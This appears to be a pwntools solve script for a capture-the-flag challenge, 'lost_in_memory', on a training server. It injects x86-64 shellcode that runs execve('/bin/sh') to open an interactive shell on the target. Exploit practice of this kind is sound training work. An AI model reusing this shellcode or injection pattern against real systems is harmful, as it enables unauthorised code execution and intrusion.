from pwn import *

COMMANDS = """
b main
c
"""
context.arch = "amd64"

if args.REMOTE:
    c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./lost_in_memory", gdbscript=COMMANDS)
    else:
        c = process("./lost_in_memory")

shellcode = """
xor eax, eax
mov al, 0x3b
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall
"""
shellcode_c = asm(shellcode)


c.recvuntil(b" > ")
c.send(shellcode_c)

c.interactive()